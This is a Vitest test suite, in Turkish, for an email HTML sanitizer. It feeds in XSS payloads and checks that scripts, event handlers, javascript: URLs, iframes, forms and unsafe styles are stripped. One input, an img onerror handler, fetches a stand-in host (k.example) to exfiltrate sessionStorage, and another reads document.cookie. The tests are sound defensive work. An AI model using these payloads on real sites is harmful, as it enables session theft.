import { describe, expect, it } from "vitest";
import { epostaHtmliniTemizle } from "./eposta-html";

describe("SEC-01 e-posta HTML temizleyici", () => {
  it("betik, olay öznitelikleri ve javascript: bağlantıları atılır", () => {
    const temiz = epostaHtmliniTemizle(
      `<p onclick="alert(1)">Merhaba</p><script>alert(document.cookie)</script><img src="x" onerror="fetch('//k.example/'+sessionStorage.x)"><a href="javascript:alert(1)">tıkla</a><a href="JaVaScRiPt&colon;alert(1)">2</a>`,
    )!;
    expect(temiz).not.toMatch(/script|onerror|onclick|javascript|alert/i);
    expect(temiz).toContain("<p>Merhaba</p>");
  });

  it("form, iframe, svg, style ve link atılır; içerikleri ekrana düşmez", () => {
    const temiz = epostaHtmliniTemizle(
      `<style>body{display:none}</style><link rel="stylesheet" href="https://k.example/a.css"><iframe src="https://k.example"></iframe><form action="https://k.example"><input name="parola"></form><svg><script>alert(1)</script></svg><math><mi>x</mi></math>Metin`,
    );
    expect(temiz).toBe("Metin");
  });

  it("bağlantılar yeni sekmede noopener ile açılır; güvenli şemalar kalır", () => {
    const temiz = epostaHtmliniTemizle(`<a href="https://ornek.com" target="_self">site</a> <a href="mailto:a@b.com">posta</a>`)!;
    expect(temiz).toContain(`<a href="https://ornek.com" target="_blank" rel="noopener noreferrer nofollow">site</a>`);
    expect(temiz).toContain(`href="mailto:a@b.com"`);
  });

  it("e-posta düzeni korunur; konumlandırma ve url() içeren stiller atılır", () => {
    const temiz = epostaHtmliniTemizle(
      `<table cellpadding="4" style="border-collapse:collapse"><tr><td style="color:#333;padding:4px 8px;position:fixed;top:0;background-image:url(javascript:alert(1))" colspan="2">Tutar</td></tr></table>`,
    )!;
    expect(temiz).toContain(`<table cellpadding="4" style="border-collapse:collapse">`);
    expect(temiz).toContain(`style="color:#333;padding:4px 8px"`);
    expect(temiz).not.toMatch(/position|url\(|javascript/);
  });

  it("görseller yalnız http(s)/data/cid ile; boş içerik null", () => {
    expect(epostaHtmliniTemizle(`<img src="https://ornek.com/logo.png" alt="logo">`)).toBe(`<img src="https://ornek.com/logo.png" alt="logo" />`);
    expect(epostaHtmliniTemizle(`<img src="vbscript:x">`)).toBe("<img />");
    expect(epostaHtmliniTemizle("<script>x</script>  ")).toBeNull();
    expect(epostaHtmliniTemizle(null)).toBeNull();
  });
});
